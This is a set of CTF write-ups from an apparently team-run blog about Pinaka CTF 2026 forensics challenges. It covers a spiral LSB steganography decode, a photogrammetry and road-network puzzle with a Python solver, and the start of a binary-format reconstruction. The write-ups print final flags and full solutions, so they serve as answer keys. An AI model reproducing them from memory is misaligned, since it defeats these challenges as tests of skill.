echo 'CVANXN{thcg9_y6c6_9ta6_f9gl9z}' | tr 'A-Za-z0-9' 'N-ZA-Mn-za-m5-90-4'
PINAKA{gupt4_l1p1_4gn1_s4ty4m}
```

## Flag

```
PINAKA{gupt4_l1p1_4gn1_s4ty4m}
```

(gupta lipi, agni satyam: "secret script, fire is truth")

## Summary

1. exiftool shows trailer data after IEND, plus Sanskrit hints pointing at binwalk, Panchavati and a spiral read.
2. binwalk finds an AES zip after IEND. The password is `PANCHAVATI`, and it holds `agni_kundal_mantra.txt`.
3. The mantra encodes its numbers in Bhutasankhya: centre (700, 500), 3.7 px per turn, red channel LSB, and mlecchita vikalpa (ROT13 + ROT5).
4. Read the red LSBs along the spiral to get a 4-byte length plus `CVANXN{thcg9_y6c6_9ta6_f9gl9z}`, then undo ROT13/ROT5 for the flag.

title: Ashokavana: The Veiled Sanctuary
excerpt: Reverse a custom binary recon format, recover a damaged detector-calibration matrix via weak-perspective photogrammetry, repair a broken road-network edge, and fuse both sources to identify the one authentic Ashoka…
content:
**[Pinaka CTF 2026](https://cyberhx.com/events/pinaka-ctf)** · Forensics · Team Cryptonite · [All 44 Pinaka write-ups](https://cyberhx.com/blog/pinaka-ctf-2026-team-cryptonite-writeups)

---

## Challenge

> Reverse a custom binary recon format, recover a damaged detector-calibration matrix via weak-perspective photogrammetry, repair a broken road-network edge, and fuse both sources to identify the one authentic Ashoka grove.
> Validator: https://pinaka-s02-cyber-xo-x.vercel.app/

We're given `recon.survey`, `city_model.json`, `supply_records.json` and a `README.md`.

Six gardens were all built from one royal plan, so from the air they look identical. We have to find the one real Ashoka grove by combining three damaged sources: aerial recon of the marker stones, the city map, and the quartermaster's ration ledger. The validator wants a pile of intermediate facts too (the recovered camera matrix, the look-alike family, the repaired road, the distances), so guessing the garden isn't enough.

## Recon format

`recon.survey` is a custom binary starting with `PNKVEIL1`. The header:

```
0x00  magic "PNKVEIL1"
0x08  u16 version=1, u16 n_images=6, u32 n_stones=7
0x10  u16 anchor flag, u32 crc32(bytes 0..0x12)
0x16  64-byte D matrix (4 num/den i64 pairs) - all zeros, the damaged calibration, then a u32 crc
0x5a  image/observation records to end of file
```

The D matrix is zeroed out, which is the "damaged detector calibration" the README warns about. We have to recover it ourselves.

Each observation record is `[u16 stone_id][i64 px_num][i64 px_den][i64 py_num][i64 py_den][u32 crc32]`, the crc covering the 34 bytes before it. Observations are grouped per image, and I split images on a stone-id reset. Rather than trust the record offsets, I scanned the file for every 34-byte window whose trailing 4 bytes are its crc32 - that recovers the intact records and silently drops the torn ones.

That gives 35 good observations in 6 images:

```
image 0:  stones [0, 1]                 <- the anchor (square-on)
image 1:  stones [0, 1, 2, 3, 4, 5, 6]
image 2:  stones [0, 1, 2, 4, 5, 6]     <- stone 3 torn
image 3:  stones [0, 1, 2, 3, 4, 5, 6]
image 4:  stones [0, 1, 2, 3, 4, 6]     <- stone 5 torn
image 5:  stones [0, 1, 2, 3, 4, 5, 6]
```

## Photogrammetry: recovering D

The model is `obs = D * (s*R*T + t)`, where `T` is a stone's template coordinate, `(s, R, t)` is a per-image similarity (scale, rotation, shift), and `D` is one global detector-defect matrix shared by every image. The anchor (image 0) is square-on: `s = 1`, `R = I`, `t = 0`, so for it `obs = D * T`.

Stones 0 and 1 are the same in every garden's template: stone 0 is `(2, 1)`, stone 1 is `(1, 3)`. The anchor observes them at `(5/2, 1)` and `(3/2, 13/4)`. That's four linear equations for the four entries of `D`:

```
D * (2, 1) = (5/2, 1)
D * (1, 3) = (3/2, 13/4)
```

Solving over the rationals:

```
D = [[6/5, 1/10], [-1/20, 11/10]]
```

## The look-alike family

For every other image, apply `D^-1` to its observations. The result should be an exact similarity transform of some candidate garden's template. I fit `s*R` and `t` from two stones (as `[a, -b; b, a]` plus a shift) and checked that it reproduces every remaining stone exactly, over the rationals, with no rounding.

The gardens whose template is consistent with all the images are **1, 2 and 4**. Gardens 0, 3 and 5 each differ in a single stone, so they're decoys. The three authentic ones share one layout, which is exactly why photogrammetry alone can't pick between them, and why we need the ledger.

The template fingerprint for the shared layout (sorted stones, `id:px/py` as exact fractions, sha256):

```
feec6a12bc90a538ec4ca3a72b74f62ae0bc4579c1d3a41cdc7706aba994cec4
```

## The road network

`supply_records.json` has the roads with one edge overwritten by the sentinel `-1`. The known edges sum to `10 + 14 + 19 + 7 + 25 = 75`, and the published total is 79, so the missing length is `79 - 75 = 4`. The broken edge `[2, 3, -1]` repairs to `[2, 3, 4]`.

Dijkstra from the depot (node 0) over the repaired network:

```
garden 0 -> 7
garden 1 -> 10
garden 2 -> 14
garden 3 -> 14
garden 4 -> 19
garden 5 -> 25
```

The ledger says the porters carried `(50 - 8) / 3 = 14` leagues to the sanctuary.

## Fuse

Only one garden is in the authentic family **and** sits at road distance 14 from the depot. Garden 3 is also at distance 14 but it's a decoy (fails photogrammetry); gardens 1 and 4 are authentic but at the wrong distance. That leaves **garden 2, Shimshapa Bower**.

I put the whole thing in one script:

```python
import json, struct, zlib, hashlib, heapq
from fractions import Fraction as F

D = open("recon.survey", "rb").read()
obs = []
for st in range(0x16, len(D) - 37):
    if zlib.crc32(D[st:st+34]) == struct.unpack_from("<I", D, st+34)[0]:
        sid = struct.unpack_from("<H", D, st)[0]
        n = [struct.unpack_from("<q", D, st+2+8*i)[0] for i in range(4)]
        obs.append((sid, F(n[0], n[1]), F(n[2], n[3])))

images, cur = [], []
for o in obs:
    if cur and o[0] <= cur[-1][0]:
        images.append(cur); cur = []
    cur.append(o)
images.append(cur)

model = json.load(open("city_model.json"))
T = {g["id"]: {int(k): (F(v[0]), F(v[1])) for k, v in g["template"].items()} for g in model["gardens"]}

# D from the anchor: obs = D * T on stones 0 and 1
(sa, xa, ya), (sb, xb, yb) = images[0][0], images[0][1]
Ta, Tb = T[0][sa], T[0][sb]
den = Ta[0]*Tb[1] - Ta[1]*Tb[0]
d00 = (xa*Tb[1] - xb*Ta[1]) / den; d01 = (Ta[0]*xb - Tb[0]*xa) / den
d10 = (ya*Tb[1] - yb*Ta[1]) / den; d11 = (Ta[0]*yb - Tb[0]*ya) / den
det = d00*d11 - d01*d10
Dinv = ((d11/det, -d01/det), (-d10/det, d00/det))
ap = lambda M, p: (M[0][0]*p[0]+M[0][1]*p[1], M[1][0]*p[0]+M[1][1]*p[1])

def consistent(img, tm):
    pts = {s: ap(Dinv, (x, y)) for s, x, y in img}
    ids = sorted(pts)
    i, j = ids[0], ids[1]
    dx, dy = tm[i][0]-tm[j][0], tm[i][1]-tm[j][1]
    rx, ry = pts[i][0]-pts[j][0], pts[i][1]-pts[j][1]
    dd = dx*dx + dy*dy
    a = (dx*rx + dy*ry) / dd; b = (dx*ry - dy*rx) / dd
    tx = pts[i][0] - (a*tm[i][0] - b*tm[i][1]); ty = pts[i][1] - (b*tm[i][0] + a*tm[i][1])
    return all((a*tm[s][0]-b*tm[s][1]+tx, b*tm[s][0]+a*tm[s][1]+ty) == pts[s] for s in ids)

family = sorted(g for g, tm in T.items() if all(consistent(im, tm) for im in images[1:]))

sup = json.load(open("supply_records.json"))
roads = [e[:] for e in sup["roads"]]
bad = next(e for e in roads if e[2] == sup["corrupt_sentinel"])
bad[2] = sup["royal_total_length"] - sum(e[2] for e in roads if e[2] != sup["corrupt_sentinel"])

adj = {}
for u, v, w in roads:
    adj.setdefault(u, []).append((v, w)); adj.setdefault(v, []).append((u, w))
dist = {0: 0}; pq = [(0, 0)]
while pq:
    dd, u = heapq.heappop(pq)
    for v, w in adj[u]:
        if dd + w < dist.get(v, 1 << 60):
            dist[v] = dd + w; heapq.heappush(pq, (dd + w, v))
ledger = (sup["rations_dispatched"] - sup["rations_returned"]) // sup["rations_per_league"]
gdist = {int(g): dist[n] for g, n in sup["garden_nodes"].items()}

gid = next(g for g in family if gdist[g] == ledger)
tm = T[gid]
dig = hashlib.sha256(";".join(
    f"{s}:{tm[s][0].numerator}/{tm[s][0].denominator},{tm[s][1].numerator}/{tm[s][1].denominator}"
    for s in sorted(tm)).encode()).hexdigest()
print(json.dumps({
    "garden_id": gid,
    "detector": {"d00": [d00.numerator, d00.denominator], "d01": [d01.numerator, d01.denominator],
                 "d10": [d10.numerator, d10.denominator], "d11": [d11.numerator, d11.denominator]},
    "template_digest": dig, "authentic_family": family,
    "repaired_edge": bad, "ledger_distance": ledger, "garden_distance": gdist[gid]}))
```

```
python3 solve.py > payload.json
cat payload.json
{"garden_id": 2, "detector": {"d00": [6, 5], "d01": [1, 10], "d10": [-1, 20], "d11": [11, 10]}, "template_digest": "feec6a12bc90a538ec4ca3a72b74f62ae0bc4579c1d3a41cdc7706aba994cec4", "authentic_family": [1, 2, 4], "repaired_edge": [2, 3, 4], "ledger_distance": 14, "garden_distance": 14}
```

## Submitting

```
curl -X POST https://pinaka-s02-cyber-xo-x.vercel.app/sanctuary/verify \
  -H 'Content-Type: application/json' -d @payload.json
{"flag":"PINAKA{setu_bandhan_veiled_sanctuary_fused_recon_and_rations}","proclamation":"Hanuman has found Sita in the true Ashoka grove","status":"sanctuary-confirmed"}
```

## Flag

```
PINAKA{setu_bandhan_veiled_sanctuary_fused_recon_and_rations}
```

## Summary

1. `recon.survey` is a custom binary with a zeroed detector matrix and per-stone observation records, each ending in a crc32. Scan for crc-valid records to recover the intact observations and drop the torn ones.
2. The anchor image gives `obs = D*T`; two shared stones solve the global defect matrix `D = [[6/5, 1/10], [-1/20, 11/10]]`.
3. Apply `D^-1` to the other images and check which gardens' templates they match as similarities: the authentic look-alike family is 1, 2, 4.
4. Repair the road edge `[2, 3, 4]` from the total length, run Dijkstra from the depot, and read the ledger distance `(50 - 8) / 3 = 14`.
5. The only authentic garden at distance 14 is garden 2, Shimshapa Bower.

title: Chitrakuta: The Vanishing Footprints
excerpt: Three undocumented binary artifacts encode a bird's-eye survey, uncalibrated watch-tower sightings, and a partial trail record. Invert the non-standard map projection, self-calibrate instruments, and reconstruct the…
content:
**[Pinaka CTF 2026](https://cyberhx.com/events/pinaka-ctf)** · Forensics · Team Cryptonite · [All 44 Pinaka write-ups](https://cyberhx.com/blog/pinaka-ctf-2026-team-cryptonite-writeups)

---

## Challenge

> Three undocumented binary artifacts encode a bird's-eye survey, uncalibrated watch-tower sightings, and a partial trail record. Invert the non-standard map projection, self-calibrate instruments, and reconstruct the single true route.
> Validator: https://pinaka-v02-cyber-xo-x.vercel.app/

We're given `survey.gcp`, `towers.obs`, `route.frags` and a `README.md`.

The README has the story and, more usefully, the exact JSON the validator expects. It wants the route, the true-ground position of every footprint, a SHA-256 of the plate projection `H`, and the calibration of all 18 towers, **all as exact fractions**. Floats were never going to work here, so I used Python's `Fraction` the whole way through.

![submission section](https://cyberhx.com/writeups/cryptonite/forensics/1.webp)

## Recon

None of the three files has a published format, so I started with a hexdump:

```
xxd survey.gcp | head
xxd towers.obs | head
xxd route.frags | head
```

```
00000000: 504e 4b47 4350 3031 0100 2e00 0000 0000  PNKGCP01........
00000010: 0000 0000 9001 0000 9001 0000 f704 6c30  ..............l0
00000020: 0100 3e01 0000 8300 0000 8508 0000 0000  ..>.............
00000030: 0000 fd06 0000 0000 0000 6604 0000 0000  ..........f.....

00000050: 1601 0000 5b00 0000 4507 0000 0000 0000  ....[...E.......
00000060: 5d06 0000 0000 0000 5e00 0000 0000 0000  ].......^.......
00000070: b500 0000 0000 0000 748b 8071 0300 a400  ........t..q....
00000080: 0000 5b00 0000 9904 0000 0000 0000 7905  ..[...........y.
00000090: 0000 0000 0000 f400 0000 0000 0000 d301  ................
00000000: 504e 4b4f 4253 3031 0100 1200 a005 0000  PNKOBS01........
00000010: b8d4 bf32 0000 0001 0080 db1a 0000 0000  ...2............
00000020: 00c9 6b03 0000 0000 00b3 fc08 3200 0000  ..k.........2...
00000030: 0200 6080 0700 0000 0000 8305 0100 0000  ..`.............
00000040: 0000 cf07 0b12 0000 0003 0072 6d00 0000  ...........rm...
00000050: 0000 00bf 0c00 0000 0000 004b 65e8 b900  ...........Ke...
00000060: 0000 0400 4061 0f00 0000 0000 e50c 0100  ....@a..........
00000070: 0000 0000 5e5c 4f0e 0000 0005 0020 7b02  ....^\O...... {.
00000080: 0000 0000 0027 3200 0000 0000 00da b848  .....'2........H
00000090: 4700 0000 0600 b23e 1700 0000 0000 ed4f  G......>.......O
00000000: 504e 4b52 5445 3031 0100 1300 f903 21e5  PNKRTE01......!.
00000010: 5caa f803 0904 5d20 7fb6 0904 0404 5739  \.....] ......W9
00000020: 4438 0304 fb03 e2b1 b95a 0504 0604 6de4  D8.......Z....m.
00000030: a440 f303 ed03 1704 08c5 f403 f203 3032  .@............02
00000040: 8595 ef03 0504 7700 04d7 ed03 ff03 6854  ......w.......hT
00000050: 3a0d fd03 0a04 ac83 8caa f703 f503 190b  :...............
00000060: 71c8 0604 f803 1312 4a46 fb03 0104 bb05  q.......JF......
00000070: 136c f503 ef03 4939 55d2 f903 f303 acdb  .l....I9U.......
```
